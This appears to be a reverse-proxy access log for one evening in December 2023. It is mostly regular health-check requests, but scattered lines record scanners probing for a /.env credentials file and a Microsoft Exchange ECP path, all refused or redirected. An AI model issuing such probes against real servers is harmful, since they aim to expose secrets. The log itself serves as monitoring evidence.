167.71.120.76 - - [15/Dec/2023:22:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2392 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2393 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2394 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2395 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2396 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2397 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2398 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2399 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2400 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2401 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2402 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2403 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2404 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2405 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2406 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2407 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2408 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2409 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2410 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2411 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2412 "www@docker" "http://172.28.0.10:80" 1ms
198.235.24.227 - - [15/Dec/2023:22:37:57 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 2413 "www@docker" "http://172.28.0.10:80" 41ms
159.203.109.206 - - [15/Dec/2023:22:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2414 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2415 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2416 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2417 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2418 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2419 "www@docker" "http://172.28.0.10:80" 0ms
12.248.214.166 - - [15/Dec/2023:22:41:10 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2420 "livetrace@docker" "http://172.28.0.5:80" 89ms
159.203.109.206 - - [15/Dec/2023:22:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2421 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2422 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2423 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2424 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2425 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2426 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2427 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2428 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2429 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2430 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2431 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2432 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2433 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2434 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2435 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2436 "www@docker" "http://172.28.0.10:80" 1ms
35.190.199.12 - - [15/Dec/2023:22:48:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2437 "-" "-" 0ms
198.235.24.254 - - [15/Dec/2023:22:48:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2438 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2439 "www@docker" "http://172.28.0.10:80" 1ms
205.210.31.231 - - [15/Dec/2023:22:49:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2440 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:22:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2441 "www@docker" "http://172.28.0.10:80" 1ms
78.153.140.221 - - [15/Dec/2023:22:50:09 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2442 "-" "-" 0ms
78.153.140.221 - - [15/Dec/2023:22:50:11 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2443 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2444 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2445 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2446 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2447 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2448 "www@docker" "http://172.28.0.10:80" 1ms
12.248.214.166 - - [15/Dec/2023:22:52:24 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2449 "livetrace@docker" "http://172.28.0.5:80" 5007ms
167.71.120.76 - - [15/Dec/2023:22:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2450 "www@docker" "http://172.28.0.10:80" 0ms
198.235.24.2 - - [15/Dec/2023:22:52:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2451 "dashboard@internal" "-" 0ms
198.235.24.2 - - [15/Dec/2023:22:52:42 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 2452 "dashboard@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2453 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2454 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2455 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2456 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2457 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2458 "www@docker" "http://172.28.0.10:80" 1ms
198.199.94.11 - - [15/Dec/2023:22:55:50 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 19 "-" "-" 2459 "-" "-" 0ms
12.248.214.166 - - [15/Dec/2023:22:56:05 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2460 "livetrace@docker" "http://172.28.0.5:80" 8ms
159.203.109.206 - - [15/Dec/2023:22:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2461 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2462 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2463 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2464 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2465 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2466 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2467 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2468 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2469 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2470 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2471 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2472 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2473 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2474 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2475 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2476 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2477 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2478 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2479 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2480 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2481 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2482 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2483 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2484 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2485 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2486 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2487 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2488 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2489 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2490 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2491 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2492 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2493 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2494 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2495 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2496 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2497 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2498 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2499 "www@docker" "http://172.28.0.10:80" 1ms
172.59.217.151 - - [15/Dec/2023:23:15:28 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2500 "livetrace@docker" "http://172.28.0.5:80" 40ms
172.59.217.151 - - [15/Dec/2023:23:15:29 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 2501 "livetrace@docker" "http://172.28.0.5:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2502 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2503 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2504 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2505 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2506 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2507 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2508 "www@docker" "http://172.28.0.10:80" 0ms
143.110.222.166 - - [15/Dec/2023:23:19:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2509 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2510 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2511 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2512 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2513 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2514 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2515 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2516 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2517 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:23:23:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2518 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:23:23:12 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2519 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2520 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2521 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2522 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2523 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2524 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2525 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2526 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2527 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2528 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2529 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:23:28:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2530 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2531 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2532 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2533 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2534 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2535 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2536 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2537 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2538 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2539 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2540 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2541 "www@docker" "http://172.28.0.10:80" 33ms
167.71.120.76 - - [15/Dec/2023:23:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2542 "www@docker" "http://172.28.0.10:80" 14ms
159.203.109.206 - - [15/Dec/2023:23:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2543 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2544 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2545 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2546 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2547 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2548 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2549 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2550 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2551 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2552 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2553 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2554 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2555 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2556 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2557 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2558 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2559 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2560 "www@docker" "http://172.28.0.10:80" 0ms
69.28.94.160 - - [15/Dec/2023:23:42:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2561 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2562 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2563 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2564 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2565 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2566 "www@docker" "http://172.28.0.10:80" 0ms
95.214.235.169 - - [15/Dec/2023:23:45:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2567 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:23:45:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2568 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:23:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2569 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2570 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2571 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2572 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2573 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2574 "www@docker" "http://172.28.0.10:80" 1ms
